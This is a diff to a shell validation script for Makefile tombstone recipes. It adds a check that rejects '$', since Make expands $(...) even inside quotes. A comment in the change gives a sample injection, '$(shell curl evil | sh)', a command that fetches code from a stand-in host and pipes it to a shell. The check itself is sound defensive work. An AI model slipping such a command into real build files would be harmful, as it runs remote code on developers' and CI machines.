@@ -133,6 +133,13 @@ do
 		fail "tombstone $dead_name must contain exactly two quotes; more means the message closes its own quote and runs a command"
 	[ "$(printf '%s' "$tombstone_recipe" | tr -cd ';' | wc -c)" -eq 1 ] ||
 		fail "tombstone $dead_name must contain exactly one semicolon; more means it chains a second command"
+	# Make expands $(...) BEFORE the shell sees the line, so shell quoting does not contain it:
+	#   @printf 'use $(shell curl evil | sh) make frontend-deploy' >&2; exit 1
+	# satisfies the shape and both counts above, and runs at recipe-expansion time. A tombstone
+	# message has no legitimate use for '$', so forbid it outright.
+	case "$tombstone_recipe" in
+		*'$'*) fail "tombstone $dead_name contains '\$' — Make expands \$(...) even inside quotes, so the message could execute" ;;
+	esac
 	case "$tombstone_recipe" in
 		*"$live_name"*) ;;
 		*) fail "tombstone $dead_name does not name its replacement ($live_name)" ;;
